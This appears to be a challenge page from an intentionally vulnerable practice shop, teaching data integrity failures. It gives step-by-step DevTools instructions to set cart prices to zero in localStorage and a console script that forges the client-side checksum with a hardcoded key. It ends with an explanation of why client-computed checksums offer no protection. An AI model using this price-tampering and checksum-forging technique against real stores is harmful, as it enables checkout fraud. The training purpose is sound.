📁 Case File — Data Integrity Failures
SituationThe shopping cart stores items and prices in the browser's localStorage. A weak checksum is supposed to prevent tampering.
At RiskFinancial integrity — cart totals could be manipulated at checkout by anyone who understands the checksum.
Your RoleReverse-engineer the integrity check and modify cart prices to prove the data cannot be trusted.

How to Exploit

Step 1 — Tamper the price:

  1. Open DevTools (F12)
  2. Go to Application tab
  3. Expand Local Storage → this origin
  4. Find key subshop_cart — edit any "price" to 0
  5. Press F5 to reload

Step 2 — Forge the checksum:

  1. Read CART_SIGN_KEY and cartChecksum() in page source
  2. Run this in the Console after editing the cart:
const k='subshop-cart-hmac-2026';
const c=JSON.parse(localStorage.getItem('subshop_cart'));
let h=5381; const s=k+JSON.stringify(c);
for(let i=0;i<s.length;i++){h=((h<<5)+h)^s.charCodeAt(i);h=h>>>0;}
localStorage.setItem('subshop_cart_cs',h.toString(16).padStart(8,'0'));
location.reload();
Cart tampered successfully — challenge complete!
🦆

Data that travels through the client can be tampered with before it reaches the server. A checksum computed with a client-side key provides no real integrity — the user can recompute it.

Think of it like: Changing your receipt yourself before paying at the register — and the register trusts whatever the receipt says.

Real world: 2014 multiple retailers exploited via client-side price manipulation in cart flows.
